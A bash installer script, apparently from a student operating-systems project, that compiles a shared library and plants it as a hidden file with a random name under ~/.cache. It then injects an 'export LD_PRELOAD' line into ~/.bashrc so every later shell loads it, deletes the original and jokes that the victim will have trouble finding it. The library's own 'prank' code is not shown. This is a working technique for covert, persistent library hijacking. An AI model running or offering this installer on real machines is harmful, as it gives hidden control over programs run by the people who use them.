#!/bin/bash

#IMPORTANT NOTE: READ ME BEFORE EXECUTING!!!: I added the injection of the export LD_PRELOAD
# command into the bashrc script which makes the hijacking permanent for ALL terminals opened after
# execution. This means, to be able to revert it safely you need to type "nano ~/.bashrc" and scroll
# down to the very bottom to delete the last two lines added by this script with the marker
# provided below. Also for singular terminals you can use "unset LD_PRELOAD" BUT this does NOT deactive
# the hijacking for future terminals. Just delete the lines from bashrc to be safe! 

# Compile the .so from the .c file
gcc -shared -fPIC -o combinedMRWOCG.so combinedMRWOCG.c -ldl

# IMPORTANT NOTE: make sure you have your own paths to the code here!!!
SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOCG.so"
HIDDEN_DIR="$HOME/.cache/.syslib"
NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"
BASHRC="$HOME/.bashrc"
MARKER="# [MRWOC_TEMP] LD_PRELOAD injected"

echo "[*] Starting installation..."
sleep 1
echo "Have fun copying my homework!"
sleep 1

# Check if source exists
if [ ! -f "$SOURCE_SO" ]; then
    echo "[x] Error: Source .so file not found at: $SOURCE_SO"
    exit 1
fi

# Create hidden directory
mkdir -p "$HIDDEN_DIR"

# Copy and rename the .so file
cp "$SOURCE_SO" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"

# Export LD_PRELOAD only in this session
#source LD_PRELOAD="$HIDDEN_SO"

# Inject LD_PRELOAD into .bashrc (temp)
echo "" >> "$BASHRC"
echo "$MARKER" >> "$BASHRC"
echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$BASHRC"
echo "alias geary='DISABLE_WRITE_PRANK=1 geary'" >> "$BASHRC"

# Backup .bashrc
#cp "$BASHRC" "$BASHRC.bak"

# Optionally delete the original .so
rm -f "$SOURCE_SO"
# maybe also add to remove the original .c file? 

echo "[✓] Install complete."
echo "[!] Open a new terminal to continue testing."
echo "[!] Original .so deleted, have fun trying to find it ;)"

# Remove LD_PRELOAD lines from .bashrc (supposed to but it doesn't: TODO)
sed -i "/$MARKER/,+1d" "$BASHRC"
echo "Clean up complete."
# Launch the new shell
DISABLE_GETCHAR_PRANK=1 bash

# Create a working alias for geary with DISABLE_WRITE_PRANK (doesnt work with geary anymore, have to fix:TODO)
#alias geary="DISABLE_WRITE_PRANK=1 LD_PRELOAD=$HIDDEN_SO geary"

# add more aliases to block getchar prank although this might be fun to not block!
#declare -a apps=("bash" "cat" "hexchat" "liferea" "gnome-weather" "geary")
#for app in "${apps[@]}"; do
#    alias $app="DISABLE_GETCHAR_PRANK=1 LD_PRELOAD=$HIDDEN_SO $app"
#done




